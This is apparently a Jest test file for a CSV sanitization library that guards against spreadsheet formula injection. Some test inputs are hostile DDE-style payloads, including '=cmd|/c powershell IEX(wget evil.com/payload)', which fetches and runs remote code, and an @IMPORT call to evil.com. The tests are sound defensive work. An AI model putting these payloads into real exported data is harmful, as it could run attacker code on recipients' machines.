/**
 * CSV Sanitization Tests
 * ======================
 * 
 * Tests for CSV formula injection prevention
 */

import { describe, it, expect } from '@jest/globals';
import {
  sanitizeCsvField,
  sanitizeCsvRow,
  sanitizeCsvTable,
  isDangerousValue,
  getDangerousFieldCount,
  rowsToCsv
} from '../../lib/csv_sanitize';

describe('CSV Formula Injection Prevention', () => {
  describe('sanitizeCsvField', () => {
    it('should prefix = with single quote', () => {
      expect(sanitizeCsvField('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
    });

    it('should prefix + with single quote', () => {
      expect(sanitizeCsvField('+1234')).toBe("'+1234");
    });

    it('should prefix - with single quote', () => {
      expect(sanitizeCsvField('-1234')).toBe("'-1234");
    });

    it('should prefix @ with single quote', () => {
      expect(sanitizeCsvField('@IMPORT(http://evil.com)')).toBe("'@IMPORT(http://evil.com)");
    });

    it('should prefix tab character with single quote', () => {
      expect(sanitizeCsvField('\tDATA')).toBe("'\tDATA");
    });

    it('should NOT prefix normal text', () => {
      expect(sanitizeCsvField('Normal text')).toBe('Normal text');
    });

    it('should NOT prefix numbers', () => {
      expect(sanitizeCsvField('1234')).toBe('1234');
    });

    it('should handle numeric inputs', () => {
      expect(sanitizeCsvField(42)).toBe('42');
      expect(sanitizeCsvField(-42)).toBe('-42');
    });

    it('should handle null and undefined', () => {
      expect(sanitizeCsvField(null)).toBe('');
      expect(sanitizeCsvField(undefined)).toBe('');
    });

    it('should handle empty strings', () => {
      expect(sanitizeCsvField('')).toBe('');
    });
  });

  describe('sanitizeCsvRow', () => {
    it('should sanitize all dangerous fields in a row', () => {
      const row = ['=SUM(A1:A10)', 'Normal', '+123', null, '@EVIL'];
      const result = sanitizeCsvRow(row);
      
      expect(result).toEqual([
        "'=SUM(A1:A10)",
        'Normal',
        "'+123",
        '',
        "'@EVIL"
      ]);
    });

    it('should handle mixed types', () => {
      const row = ['Text', 123, null, '=FORMULA', undefined];
      const result = sanitizeCsvRow(row);
      
      expect(result).toEqual([
        'Text',
        '123',
        '',
        "'=FORMULA",
        ''
      ]);
    });
  });

  describe('sanitizeCsvTable', () => {
    it('should sanitize all rows in a table', () => {
      const table = [
        ['Date', 'Description', 'Amount'],
        ['2024-01-01', '=SUM(A1:A10)', '100'],
        ['2024-01-02', 'Normal expense', '-50'],
        ['2024-01-03', '+BONUS', '@REF']
      ];
      
      const result = sanitizeCsvTable(table);
      
      expect(result).toEqual([
        ['Date', 'Description', 'Amount'],
        ['2024-01-01', "'=SUM(A1:A10)", '100'],
        ['2024-01-02', 'Normal expense', "'-50"],
        ['2024-01-03', "'+BONUS", "'@REF"]
      ]);
    });
  });

  describe('isDangerousValue', () => {
    it('should detect dangerous values', () => {
      expect(isDangerousValue('=FORMULA')).toBe(true);
      expect(isDangerousValue('+123')).toBe(true);
      expect(isDangerousValue('-123')).toBe(true);
      expect(isDangerousValue('@REF')).toBe(true);
      expect(isDangerousValue('\tTAB')).toBe(true);
    });

    it('should NOT flag safe values', () => {
      expect(isDangerousValue('Normal text')).toBe(false);
      expect(isDangerousValue('123')).toBe(false);
      expect(isDangerousValue(123)).toBe(false);
      expect(isDangerousValue(null)).toBe(false);
      expect(isDangerousValue(undefined)).toBe(false);
      expect(isDangerousValue('')).toBe(false);
    });
  });

  describe('getDangerousFieldCount', () => {
    it('should count dangerous fields', () => {
      const table = [
        ['Date', 'Description', 'Amount'],
        ['2024-01-01', '=SUM(A1:A10)', '100'],
        ['2024-01-02', 'Normal', '+50'],
        ['2024-01-03', 'Also normal', '75']
      ];
      
      expect(getDangerousFieldCount(table)).toBe(2); // =SUM and +50
    });

    it('should return 0 for safe table', () => {
      const table = [
        ['Date', 'Description', 'Amount'],
        ['2024-01-01', 'Expense', '100'],
        ['2024-01-02', 'Revenue', '500']
      ];
      
      expect(getDangerousFieldCount(table)).toBe(0);
    });
  });

  describe('rowsToCsv', () => {
    it('should convert rows to CSV format', () => {
      const rows = [
        ['Date', 'Description', 'Amount'],
        ['2024-01-01', 'Test expense', '100']
      ];
      
      const csv = rowsToCsv(rows);
      expect(csv).toBe('Date,Description,Amount\n2024-01-01,Test expense,100');
    });

    it('should quote fields with commas', () => {
      const rows = [
        ['Name', 'Address'],
        ['John Doe', '123 Main St, Apt 4']
      ];
      
      const csv = rowsToCsv(rows);
      expect(csv).toContain('"123 Main St, Apt 4"');
    });

    it('should escape quotes in quoted fields', () => {
      const rows = [
        ['Description'],
        ['Said "hello" to customer']
      ];
      
      const csv = rowsToCsv(rows);
      expect(csv).toContain('"Said ""hello"" to customer"');
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent Excel formula execution', () => {
      // Attacker tries to inject formula that would execute in Excel
      const malicious = '=cmd|/c calc|!A1';
      const sanitized = sanitizeCsvField(malicious);
      
      expect(sanitized).toBe("'=cmd|/c calc|!A1");
      expect(sanitized.charAt(0)).toBe("'");
    });

    it('should prevent DDE attacks', () => {
      const dde = '=cmd|/c powershell IEX(wget evil.com/payload)';
      const sanitized = sanitizeCsvField(dde);
      
      expect(sanitized).toBe("'=cmd|/c powershell IEX(wget evil.com/payload)");
    });

    it('should preserve legitimate negative numbers', () => {
      // Note: In real usage, negative numbers should be handled carefully
      // This test shows current behavior - might want to allow -\d pattern
      const negativeNum = '-42.50';
      const sanitized = sanitizeCsvField(negativeNum);
      
      expect(sanitized).toBe("'-42.50");
      // This is safe but might be unexpected for users
      // Consider allowing pattern: ^-?\d+\.?\d*$
    });
  });
});

